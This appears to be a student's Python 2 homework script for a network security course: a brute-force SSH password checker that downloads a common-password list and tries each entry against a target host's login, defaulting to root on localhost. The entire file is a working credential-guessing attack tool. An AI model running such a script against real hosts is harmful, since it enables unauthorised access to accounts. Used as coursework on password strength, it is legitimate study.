#Josh Anderson   #101903134
#TLEN 5540
#Spring 2017

import os.path
import wget
import argparse
import paramiko 

url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10k_most_common.txt'
path = '/tmp/10k_most_common.txt'
passwd = ""

parser = argparse.ArgumentParser(description='A bruteforce password checker for ssh')
parser.add_argument('-t', action='store', dest='trgt', default='127.0.0.1', help='Target IP: default is 127.0.0.1nderson-HW1.py')   #target
parser.add_argument('-u', action='store', dest='usr', default='root', help='Username:  default is root')                            #user
parser.add_argument('-pw', action='store', dest='path', default='/tmp/10k_most_common.txt', help='Specify a different password file:  default will wget the 10k most common passwords to your /tmp directory (if it does not already exist there)')     #Password list
iput = parser.parse_args()

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

if os.path.isfile(iput.path) == False:           #If password file has not been downloaded to /tmp, download it
    wget.download(url, out=iput.path)

with open(iput.path) as f:                       #Open password file and check each line
    for line in f:
        if passwd:                               #If the password has been found, stop
            break
        else :
           line = line.strip()                   #Strip leading and ending whitespace
           print "Trgt: %s  Usr: %s  Pwd: %s" % (iput.trgt, iput.usr, line)
           try:
               client.connect(iput.trgt, username=iput.usr, password=line)
           except paramiko.ssh_exception.NoValidConnectionsError, exception:
                print "Could not find a host to SSH onto, exiting..."
                exit
           except paramiko.ssh_exception.AuthenticationException, exception:   #Prevent code from erroring out on each authentication fail
               continue
           ssh_session = client.get_transport().open_session()
           if ssh_session.active:
                passwd = line

if passwd:
    print "We're in!  %s needs a more secure password than %s" % (iput.usr, passwd)
else:
    print "All passwords have been checked, we were unable to log in as %s on %s" % (iput.usr, iput.trgt)
